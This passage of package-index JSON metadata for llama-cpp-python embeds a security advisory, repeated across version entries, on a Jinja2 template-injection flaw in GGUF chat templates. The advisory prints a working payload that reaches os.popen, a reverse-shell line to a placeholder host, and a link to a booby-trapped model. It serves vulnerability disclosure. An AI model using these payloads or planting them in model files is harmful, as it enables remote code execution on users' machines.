Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.65":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.65/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.65","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"6414247b19217d7bbfca5aa0e7bae78db857eaeb779250919c38afb7efb509ad","md5":"8e887258e13cb8f8629584b657c911bd","sha256":"5d8b8bec70576176f213b7abedda267aedafda1d165b4a30b3ebf9d3df597d55"},"downloads":-1,"filename":"llama_cpp_python-0.2.65.tar.gz","has_sig":false,"md5_digest":"8e887258e13cb8f8629584b657c911bd","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":38027898,"upload_time":"2024-04-26T14:14:03","upload_time_iso_8601":"2024-04-26T14:14:03.049780Z","url":"https://files.pythonhosted.org/packages/64/14/247b19217d7bbfca5aa0e7bae78db857eaeb779250919c38afb7efb509ad/llama_cpp_python-0.2.65.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.66":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.66/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.66","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"3f6758628b196fb39d055da7193203fc93c56212715a7c2ef4f428e64a8c07d4","md5":"94c07781e482206669b1e914aed3b5ae","sha256":"b2e917d3da38cb53cde65ca08b0b96a8709bff1a79af5d8de588bf0fc5fa535c"},"downloads":-1,"filename":"llama_cpp_python-0.2.66.tar.gz","has_sig":false,"md5_digest":"94c07781e482206669b1e914aed3b5ae","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":42442610,"upload_time":"2024-04-30T05:51:00","upload_time_iso_8601":"2024-04-30T05:51:00.573376Z","url":"https://files.pythonhosted.org/packages/3f/67/58628b196fb39d055da7193203fc93c56212715a7c2ef4f428e64a8c07d4/llama_cpp_python-0.2.66.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        